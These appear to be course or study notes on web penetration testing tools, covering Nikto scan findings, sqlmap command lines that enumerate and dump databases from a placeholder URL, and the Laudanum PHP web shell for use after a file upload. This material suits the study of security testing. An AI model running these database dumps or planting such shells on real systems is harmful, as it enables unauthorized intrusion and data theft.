Nikto
    * Open source web site scanner
    * Tests over 6700 website vulnerabilities
    * Identifies server vulnerabilities of over 270 different server versions
    * Default --not very stealthy
    * In addition to spidering, Nikto uses pathnames identified on numerous servers to guide its search

What does Nikto find
    * ClickJacking
        - Anti-clicking X-Frame-Option header is not present thus clickjacking error is found
    * Non-HttpOnly Cookies
        - Both PHPSESSID and showhints are not declared HttpOnly
        - As mentioned before, this means these cookies are easily intercepted and manipulated with js
        - can potentially used HTTP trace to find HttpOnly cookies
    * Robots.txt entries
        - Robots.txt exclusion standard describes the form of robot.txt files
        - These entries are used in theory to inform compliant web spiders that portion of a web site should not be visited
        - Robots.txt file must be readable if it is to be useful
        - May contain information identifying sensitive locations on a web site, so it provides information of potential value to intruders
    * Path injection vulnerability
        - Nikto identifies what appears to be a vulnerability in the PHP Nuke-Rocket

SQLMAP
    * Normal trivial use 
        sqlmap -u http://example.com/app?uid=15 --dbs
        -u specifies the URL
        --dbs tells sqlmap to find the databases
    * To get the tables in the database:
        sqlmap -u http://example.com/app?uid=15 --tables -D dbname
    * To get the columns in a table
        sqlmap -u http://example.com/app?uid=15 --columns -D dbname -T tablename
    * To get the contents
        sqlmap -u http://example.com/app?uid=15 --dump -D dbname -T tablename

SQLMAP - URI with post parameters
    * Collection of injectable files developed and maintained by secure ideas designed for use in pen tests
    * Found in /usr/share/laudanum
    * One script that is useful if you can do php executable file upload is shell.php

Laudanum Shell
   * Interact through command window
